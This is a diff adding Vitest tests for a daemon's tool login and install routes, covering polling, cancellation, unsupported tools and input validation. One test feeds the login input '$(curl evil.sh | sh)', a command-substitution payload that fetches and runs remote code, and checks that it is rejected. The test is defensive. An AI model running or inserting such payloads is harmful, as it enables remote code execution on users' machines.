@@ -11,6 +11,7 @@ import {
 } from '@/lib/project/tool-auth'
 import { loadPreferences } from '@/lib/project/preferences'
 import type * as projectAddModule from '@/lib/project/add'
+import type * as cliResolveModule from '@/daemon/cli-resolve'
 import type { ProjectMeta, ClaudeOAuthBundle } from '@/shared/types'
 import { DaemonError } from '@/daemon/errors'
 import { makeTestRpcClient } from '@test/helpers/rpc'
@@ -39,12 +40,24 @@ vi.mock('@/lib/project/remove', () => ({
   removeProject: vi.fn(),
 }))
 
+// The install flow's post-exit verification resolves the CLI on the real
+// machine — mocked so the route tests pass regardless of what's installed.
+vi.mock('@/daemon/cli-resolve', async () => {
+  const actual = await vi.importActual<typeof cliResolveModule>('@/daemon/cli-resolve')
+  return {
+    ...actual,
+    resolveToolCliPath: () => '/fake/bin/tool',
+  }
+})
+
 import { createSession } from '@/daemon/session-create'
 import { deleteSession } from '@/lib/session/delete'
 import { restartSession } from '@/lib/session/restart'
 import { addProject } from '@/lib/project/add'
 import { removeProject } from '@/lib/project/remove'
 import { registerProvisioning, listProvisioning, clearAllProvisioningForTests } from '@/daemon/provisioning'
+import { clearAllToolLoginsForTests } from '@/daemon/tool-login'
+import { clearAllToolInstallsForTests } from '@/daemon/tool-install'
 
 const mockCreateSession = vi.mocked(createSession)
 const mockDeleteSession = vi.mocked(deleteSession)
@@ -587,6 +600,109 @@ describe('write routes', () => {
         json: { kind: 'api-key', apiKey: '' },
       })
       expect(res.status).toBe(400)
+    })
+  })
+
+  describe('tool login routes', () => {
+    const CODEX_STUB = path.join(__dirname, '..', 'helpers', 'fake-codex-login.cjs')
+    const CLAUDE_STUB = path.join(__dirname, '..', 'helpers', 'fake-claude-login.cjs')
+
+    beforeEach(() => {
+      process.env.YAAC_E2E_CODEX_LOGIN_CLI = JSON.stringify([process.execPath, CODEX_STUB])
+      process.env.YAAC_E2E_CLAUDE_LOGIN_CLI = JSON.stringify([process.execPath, CLAUDE_STUB])
+    })
+
+    afterEach(() => {
+      clearAllToolLoginsForTests()
+      delete process.env.YAAC_E2E_CODEX_LOGIN_CLI
+      delete process.env.YAAC_E2E_CLAUDE_LOGIN_CLI
+      delete process.env.FAKE_LOGIN_MODE
+    })
+
+    it('start → poll → success over the wire', async () => {
+      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
+      const startRes = await client.auth[':tool'].login.start.$post({ param: { tool: 'codex' } })
+      expect(startRes.status).toBe(200)
+      const started = await startRes.json()
+      expect(started.tool).toBe('codex')
+
+      await vi.waitFor(async () => {
+        const res = await client.auth.login[':id'].$get({ param: { id: started.id } })
+        expect(res.status).toBe(200)
+        expect((await res.json()).status).toBe('success')
+      }, { timeout: 10_000, interval: 50 })
+    })
+
+    it('rejects starting a login for opencode', async () => {
+      const app = buildApp({ secret: 'shh', buildId: 'test' })
+      const res = await app.request('/auth/opencode/login/start', withAuth({ method: 'POST' }))
+      expect(res.status).toBe(400)
+    })
+
+    it('rejects non-code input as VALIDATION through the route', async () => {
+      process.env.FAKE_LOGIN_MODE = 'need-input'
+      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
+      const startRes = await client.auth[':tool'].login.start.$post({ param: { tool: 'claude' } })
+      const started = await startRes.json()
+
+      const res = await client.auth.login[':id'].input.$post({
+        param: { id: started.id },
+        json: { text: '$(curl evil.sh | sh)' },
+      })
+      expect(res.status).toBe(400)
+      const body = await res.json() as unknown as { error: { code: string } }
+      expect(body.error.code).toBe('VALIDATION')
+    })
+
+    it('404s polling or feeding input to an unknown session; cancel is a no-op 204', async () => {
+      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
+      const get = await client.auth.login[':id'].$get({ param: { id: 'nope' } })
+      expect(get.status).toBe(404)
+      const input = await client.auth.login[':id'].input.$post({ param: { id: 'nope' }, json: { text: 'x' } })
+      expect(input.status).toBe(404)
+      const cancel = await client.auth.login[':id'].cancel.$post({ param: { id: 'nope' } })
+      expect(cancel.status).toBe(204)
+    })
+  })
+
+  describe('tool install routes', () => {
+    const INSTALL_STUB = path.join(__dirname, '..', 'helpers', 'fake-install-cli.cjs')
+
+    beforeEach(() => {
+      process.env.YAAC_E2E_CLAUDE_INSTALL_CLI = JSON.stringify([process.execPath, INSTALL_STUB])
+    })
+
+    afterEach(() => {
+      clearAllToolInstallsForTests()
+      delete process.env.YAAC_E2E_CLAUDE_INSTALL_CLI
+    })
+
+    it('start → poll → success over the wire', async () => {
+      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
+      const startRes = await client.auth[':tool'].install.start.$post({ param: { tool: 'claude' } })
+      expect(startRes.status).toBe(200)
+      const started = await startRes.json()
+      expect(started.tool).toBe('claude')
+
+      await vi.waitFor(async () => {
+        const res = await client.auth.install[':id'].$get({ param: { id: started.id } })
+        expect(res.status).toBe(200)
+        expect((await res.json()).status).toBe('success')
+      }, { timeout: 10_000, interval: 50 })
+    })
+
+    it('rejects starting an install for opencode', async () => {
+      const app = buildApp({ secret: 'shh', buildId: 'test' })
+      const res = await app.request('/auth/opencode/install/start', withAuth({ method: 'POST' }))
+      expect(res.status).toBe(400)
+    })
+
+    it('404s polling an unknown install; cancel is a no-op 204', async () => {
+      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
+      const get = await client.auth.install[':id'].$get({ param: { id: 'nope' } })
+      expect(get.status).toBe(404)
+      const cancel = await client.auth.install[':id'].cancel.$post({ param: { id: 'nope' } })
+      expect(cancel.status).toBe(204)
     })
   })
 
